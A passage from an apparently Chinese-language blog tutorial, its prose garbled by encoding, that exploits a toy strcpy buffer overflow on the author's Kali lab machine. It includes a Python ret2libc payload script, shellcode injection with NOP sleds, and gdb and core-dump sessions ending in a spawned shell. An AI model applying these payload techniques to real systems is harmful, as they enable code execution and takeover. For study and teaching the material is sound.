/usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br>[Inferior 1 (process 3996) exited normally]<br>Warning: not running<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> quit</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ payload åœ¨æ ˆä¸­çš„æƒ…å†µï¼Œè¿™æ¬¡æ²¡é—®é¢˜äº†ï¼ŒæˆåŠŸå¾—åˆ°ä¸€ä¸ª shellã€‚</p><p>å°è¯•åœ¨ shell ä¸­æ‰§è¡Œç¨‹åºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”€$ ./bol_64 $(python3 d.py)<br>Done!<br>zsh: segmentation fault  ./bol_64 $(python3 d.py)<br></code></pre></td></tr></table></figure><p>ä¸å‡ºæ‰€æ–™ï¼Œå¤±è´¥äº†ï¼Œç›´æ¥é€šè¿‡ core dump æ–¹å¼æŸ¥æ‰¾çœŸæ˜¯è¿”å›åœ°å€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">ulimit</span> -c unlimited</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sh -c <span class="hljs-string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./bol_64 $(python3 d.py)</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol_64 $(python3 d.py)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>core.1657191791   core.1657191862   core.1657191889   core.1657192242   core.1657192417<br>                                                                                                       <br><span class="hljs-meta">$</span><span class="bash"> gdb -q vuln /tmp/core.1657192417</span><br>vuln: No such file or directory.<br>[New LWP 1667]<br>Core was generated by `./bol_64 H1ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½ï¿½Hï¿½UI$&#x27;bGÇ¦H1X&#x27;H-ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½<br>                                                                      E<br>                                                                       )ï¿½ï¿½=Iï¿½w6â–’ï¿½ï¿½?r|(gGÇ¦ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½&#x27;.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br><span class="hljs-meta">#</span><span class="bash">0  0x00007fffffffde32 <span class="hljs-keyword">in</span> ?? ()</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg 0x00007fffffffde30</span><br>0x7fffffffde30: 0x0000000000402004      0x00007ffff7e4cf8a<br>0x7fffffffde40: 0x0000000000401180      0x00007fffffffdef0<br>0x7fffffffde50: 0x0000000000401050      0x0000000000000000<br>0x7fffffffde60: 0x0000000000000000      0x000000000040116e<br>0x7fffffffde70: 0x00007fffffffdfe8      0x0000000200000000<br>0x7fffffffde80: 0xfffde98148c93148      0xffffef058d48ffff<br>0x7fffffffde90: 0x6227244955bb48ff      0x4827583148a6c747<br>0x7fffffffdea0: 0x1df4e2fffffff82d      0x3dd5e8290b450bf1<br>0x7fffffffdeb0: 0x3ff895183677bd49      0x90a6c74767287c72<br>0x7fffffffdec0: 0x9090909090909090      0x9090909090909090<br>0x7fffffffded0: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdee0: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdef0: 0x9090909090909090      0x00007fffffffde30<br>0x7fffffffdf00: 0x00007fffffffdfe8      0x00000002f7fca000<br>0x7fffffffdf10: 0x0000000000401136      0x00007fffffffe309<br>0x7fffffffdf20: 0x0000000000401180      0xc2c83e1e466f4ea0<br>0x7fffffffdf30: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdf40: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf50: 0x3d37c1e1f86f4ea0      0x3d37d1a189034ea0<br>0x7fffffffdf60: 0x0000000000000000      0x0000000000000000<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> quit</span><br></code></pre></td></tr></table></figure><p>å‘ç°è¿è¡Œæ—¶ shellcode çš„å¼€å§‹åœ°å€å˜æˆäº† 0x7fffffffde80ï¼Œä¿®æ”¹ payloadï¼šrip = bâ€™\x80\xde\xff\xff\xff\x7fâ€™</p><p>å†æ¬¡è¿è¡ŒæˆåŠŸå¾—åˆ° shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol_64 $(python3 d.py)</span><br>Done!<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br></code></pre></td></tr></table></figure><h2 id="ret-to-libcï¼š"><a href="#ret-to-libcï¼š" class="headerlink" title="ret to libcï¼š"></a>ret to libcï¼š</h2><blockquote><p>è¿™é‡Œä½¿ç”¨æ­£å¸¸çš„32ä½bolç¨‹åº</p></blockquote><p>gdbè°ƒè¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q bol_normal</span><br>Reading symbols from bol_normal...<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> list</span><br>1       #include &lt;string.h&gt;<br>2       #include &lt;stdio.h&gt;<br>3       void main(int argc, char *argv[]) &#123;<br>4           char buffer[100];<br>5           strcpy(buffer, argv[1]);<br>6           printf(&quot;Done!\n&quot;);<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">break</span> 6</span><br>Breakpoint 1 at 0x804846e: file bol.c, line 6.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass main</span><br>Dump of assembler code for function main:<br>   0x0804844d &lt;+0&gt;:     push   ebp<br>   0x0804844e &lt;+1&gt;:     mov    ebp,esp<br>   0x08048450 &lt;+3&gt;:     and    esp,0xfffffff0<br>   0x08048453 &lt;+6&gt;:     add    esp,0xffffff80<br>   0x08048456 &lt;+9&gt;:     mov    eax,DWORD PTR [ebp+0xc]<br>   0x08048459 &lt;+12&gt;:    add    eax,0x4<br>   0x0804845c &lt;+15&gt;:    mov    eax,DWORD PTR [eax]<br>   0x0804845e &lt;+17&gt;:    mov    DWORD PTR [esp+0x4],eax<br>   0x08048462 &lt;+21&gt;:    lea    eax,[esp+0x1c]<br>   0x08048466 &lt;+25&gt;:    mov    DWORD PTR [esp],eax<br>   0x08048469 &lt;+28&gt;:    call   0x8048310 &lt;strcpy@plt&gt;<br>   0x0804846e &lt;+33&gt;:    mov    DWORD PTR [esp],0x8048510<br>   0x08048475 &lt;+40&gt;:    call   0x8048320 &lt;puts@plt&gt;<br>   0x0804847a &lt;+45&gt;:    leave  <br>   0x0804847b &lt;+46&gt;:    ret    <br>End of assembler dump.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> run AAAA</span><br>Starting program: /home/kali/StackOverflowtest/bol_normal AAAA<br>[----------------------------------registers-----------------------------------]<br>EBP: 0xffffd0d8 --&gt; 0x0 <br>ESP: 0xffffd050 --&gt; 0xffffd06c (&quot;AAAA&quot;)<br>EIP: 0x804846e (&lt;main+33&gt;:      mov    DWORD PTR [esp],0x8048510)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd050:     0xffffd06c      0xffffd377      0xf7ffd9d0      0x00000000<br>0xffffd060:     0x00000000      0x00000000      0x00000000      0x41414141<br>0xffffd070:     0x00000000      0x00000000      0xf7ffd000      0x00000000<br>0xffffd080:     0x08048350      0xf7fc9550      0x08048034      0xf7fa8a08<br>0xffffd090:     0x00000002      0xf7fdc480      0x00000000      0x080482dd<br>0xffffd0a0:     0xf7fa73fc      0xffffffff      0x0804a000      0x080484d2<br>0xffffd0b0:     0x00000002      0xffffd184      0xffffd190      0xf7df39d5<br>0xffffd0c0:     0xf7fdc480      0x00000000      0x0804848b      0x00000000<br>0xffffd0d0:     0x00000002      0x08048350      0x00000000      0xf7dda905<br>0xffffd0e0:     0x00000002      0xffffd184      0xffffd190      0xffffd114<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¾“å…¥ç‚¹æ˜¯ 0xffffd06cï¼Œebp æ˜¯ 0xffffd0d8ï¼Œå¯å¾—åç§»ä¸ºï¼š112</p><p>æŸ¥æ‰¾ system å‡½æ•°å’Œå­—ç¬¦ä¸² â€œ/bin/shâ€ çš„åœ°å€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> p system</span><br><span class="hljs-meta">$</span><span class="bash">2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e00cc0 &lt;system&gt;</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> searchmem <span class="hljs-string">&quot;/bin/sh&quot;</span></span><br>Searching for &#x27;/bin/sh&#x27; in: None ranges<br>Found 1 results, display max 1 items:<br>libc : 0xf7f4bb62 (&quot;/bin/sh&quot;)<br></code></pre></td></tr></table></figure><p>æ„é€ payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span><br>system = <span class="hljs-string">b&#x27;\xc0\x0c\xe0\xf7&#x27;</span><br>bin_sh = <span class="hljs-string">b&#x27;\x62\xbb\xf4\xf7&#x27;</span><br><br>payload = padding + system + <span class="hljs-string">b&quot;AAAA&quot;</span> + bin_sh<br><br>sys.stdout.buffer.write(payload)<br></code></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 e.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol_normal $(python3 e.py)<br>[----------------------------------registers-----------------------------------]<br>EBP: 0xffffd068 (&quot;AAAA\300\f\340\367AAAAb\273\364&quot;, &lt;incomplete sequence \367&gt;)<br>ESP: 0xffffcfe0 --&gt; 0xffffcffc (&#x27;A&#x27; &lt;repeats 112 times&gt;, &quot;\300\f\340\367AAAAb\273\364&quot;, &lt;incomplete sequence \367&gt;)<br>EIP: 0x804846e (&lt;main+33&gt;:      mov    DWORD PTR [esp],0x8048510)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffcfe0:     0xffffcffc      0xffffd2ff      0xf7ffd9d0      0x00000000<br>0xffffcff0:     0x00000000      0x00000000      0x00000000      0x41414141<br>0xffffd000:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd010:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd020:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd030:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd040:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd050:     0x41414141      0x41414141      0x41414141      0x41414141<br>0xffffd060:     0x41414141      0x41414141      0x41414141      0xf7e00cc0<br>0xffffd070:     0x41414141      0xf7f4bb62      0xffffd100      0xffffd0a4<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ payload å†™å…¥æƒ…å†µï¼Œæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œç»§ç»­è¿è¡Œï¼Œå¾—åˆ° shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>[Attaching after process 2448 vfork to child process 2453]<br>[New inferior 2 (process 2453)]<br>[Detaching vfork parent process 2448 after child exec]<br>[Inferior 1 (process 2448) detached]<br>process 2453 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br>[Attaching after process 2453 vfork to child process 2454]<br>[New inferior 3 (process 2454)]<br>[Detaching vfork parent process 2453 after child exec]<br>[Inferior 2 (process 2453) detached]<br>process 2454 is executing new program: /usr/bin/dash<br><span class="hljs-meta">$</span><span class="bash"> </span>   <br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>[Attaching after process 2454 vfork to child process 2455]<br>[New inferior 4 (process 2455)]<br>[Detaching vfork parent process 2454 after child exec]<br>[Inferior 3 (process 2454) detached]<br>process 2455 is executing new program: /usr/bin/whoami<br>kali<br>[Inferior 4 (process 2455) exited normally]<br><span class="hljs-meta">$</span><span class="bash"> Warning: not running</span><br>zsh: suspended (tty output)  gdb -q bol_normal<br></code></pre></td></tr></table></figure><p>shell ä¸­è¿è¡Œä¹ŸæˆåŠŸå¾—åˆ° shellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol_normal $(python3 e.py)</span><br>Done!<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><span class="hljs-meta">$</span><span class="bash"> exiy</span><br>/bin/sh: 3: exiy: not found<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br>zsh: segmentation fault  ./bol_normal $(python3 e.py)<br></code></pre></td></tr></table></figure><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h3><p><strong>1ã€ä¿®æ”¹ gdb ç¯å¢ƒå˜é‡</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> åˆ é™¤ LINES å’Œ COLUMNS å˜é‡</span><br><span class="hljs-meta">$</span><span class="bash"> show environment</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment LINES</span> <br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment COLUMNS</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> ç»Ÿä¸€ç¯å¢ƒ</span><br><span class="hljs-meta">#</span><span class="bash"> æ— ç¯å¢ƒå˜é‡å¯åŠ¨ï¼Œåªæœ‰ LINES å’Œ COLUMNS å˜é‡ï¼Œå¯ä»¥è¿›è¡Œåˆ é™¤</span><br><span class="hljs-meta">$</span><span class="bash"> env - gdb /home/kali/StackOverflowtest/bol</span><br><span class="hljs-meta">$</span><span class="bash"> env - /home/kali/StackOverflowtest/bol</span><br></code></pre></td></tr></table></figure><p><strong>2ã€é€šè¿‡ core dump çš„æ–¹å¼è·å–çœŸå®çš„åœ°å€ï¼š</strong></p><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/bitsec/article/details/81026447">https://blog.csdn.net/bitsec/article/details/81026447</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> äº§ç”Ÿ core æ–‡ä»¶ï¼Œå°±æ˜¯ç¨‹åºè¿è¡Œå‘ç”Ÿæ®µé”™è¯¯æ—¶çš„æ–‡ä»¶ã€‚å†™å…¥é”™è¯¯çš„ ret_addrï¼Œå¯¼è‡´ç¨‹åºé”™è¯¯ï¼Œä¼šå¾—åˆ° core æ–‡ä»¶ï¼Œç„¶åé€šè¿‡è°ƒè¯• core æ–‡ä»¶æ‰¾åˆ°æ­£ç¡®çš„ buf çš„å…¶å®åœ°å€ã€‚</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">ulimit</span> -c unlimited</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sh -c <span class="hljs-string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼Œå¾—åˆ°é”™è¯¯è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py )</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol $(python3 c.py )<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>core.1657100523<br></code></pre></td></tr></table></figure><p>gdb è°ƒè¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q vuln /tmp/core.1657100523</span><br>vuln: No such file or directory.<br>[New LWP 9988]<br>Core was generated by `./bol ...&#x27;.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br><span class="hljs-meta">#</span><span class="bash">0  0x90909090 <span class="hljs-keyword">in</span> ?? ()</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd0a0:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd0b0:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd0c0:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd0d0:     0xffffd0a0      0xffffd080      0xffffd080      0xffffd050<br>0xffffd0e0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0f0:     0x00000002      0xffffd194      0xffffd1a0      0xffffd124<br>0xffffd100:     0xffffd134      0xf7ffdb98      0xf7fc3420      0xf7fa7000<br>0xffffd110:     0x00000001      0x00000000      0xffffd178      0x00000000<br>0xffffd120:     0xf7ffd000      0x00000000      0x00000002      0x08049060<br>0xffffd130:     0x00000000      0x79122a66      0x3de2b676      0x00000000<br></code></pre></td></tr></table></figure><p>å‘ç°æ ˆçš„ä½ç½®å‘ç”Ÿäº†åç§»ï¼Œebp å˜æˆäº† 0xfffffd0d8 </p><p>ä¿®æ”¹æ•°æ®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">eip = b&#x27;\xe0\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x90\xd0\xff\xff&#x27;<br></code></pre></td></tr></table></figure><p><strong>3ã€åˆ©ç”¨è„šæœ¬ç»Ÿä¸€ç¯å¢ƒå˜é‡</strong></p><p><a href="https://github.com/hellman/fixenv">hellman/fixenv: Fix stack addresses (when no ASLR) with and without debugging (github.com)</a></p><h3 id="Offset"><a href="#Offset" class="headerlink" title="Offset"></a>Offset</h3><p>gdb å†…è®¡ç®—åç§»é‡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> pattern create 120</span> <br><span class="hljs-meta">gdb-peda$</span><span class="bash"> pattern search AA8A</span><br></code></pre></td></tr></table></figure><h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>å…ˆå†™ shellcode å†å¡«å……æ•°æ®æˆåŠŸï¼Œå…ˆå¡«å……æ•°æ®å†å†™ shellcode ä¼šå¤±è´¥ ï¼Œå¯èƒ½å› ä¸º shellcode è¢«è¦†ç›– ã€‚</p><h4 id="32-bit-program"><a href="#32-bit-program" class="headerlink" title="32 bit program"></a>32 bit program</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffcfe0:     0xffffcffc      0xffffd307      0xf7ffd9d0      0x00000000<br>0xffffcff0:     0x00000000      0x00000000      0x00000000      0x90909090<br>0xffffd000:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0xffffd030<br>0xffffd070:     0x00000000      0xffffd114      0xffffd120      0xffffd0a4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0xffffd04c,0xffffd06c</span><br>Dump of assembler code from 0xffffd04c to 0xffffd06c:<br>   0xffffd04c:  xor    eax,eax<br>   0xffffd04e:  mov    ebx,eax<br>   0xffffd050:  mov    al,0x17<br>   0xffffd052:  int    0x80<br>   0xffffd054:  xor    edx,edx<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>   0xffffd05c:  push   0x69622f2f<br>   0xffffd061:  mov    ebx,esp<br>   0xffffd063:  push   edx<br>   0xffffd064:  push   ebx<br>   0xffffd065:  mov    ecx,esp<br>   0xffffd067:  lea    eax,[edx+0xb]<br>   0xffffd06a:  int    0x80<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>EBP: 0x80cd0b42 <br>ESP: 0xffffd068 (&quot;n/sh&quot;)<br>EIP: 0xffffd05c (&quot;h//bi\211\343RS\211\341\215n/sh&quot;)<br>EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0xffffd054:  xor    edx,edx<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>=&gt; 0xffffd05c:  push   0x69622f2f<br>   0xffffd061:  mov    ebx,esp<br>   0xffffd063:  push   edx<br>   0xffffd064:  push   ebx<br>   0xffffd065:  mov    ecx,esp<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>EBP: 0x80cd0b42 <br>ESP: 0xffffd064 (&quot;//bin/sh&quot;)<br>EIP: 0xffffd061 --&gt; 0x2f52e389<br>EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0xffffd056:  push   edx<br>   0xffffd057:  push   0x68732f6e<br>   0xffffd05c:  push   0x69622f2f<br>=&gt; 0xffffd061:  mov    ebx,esp<br>   0xffffd063:  push   edx<br>   0xffffd064:  das    <br> 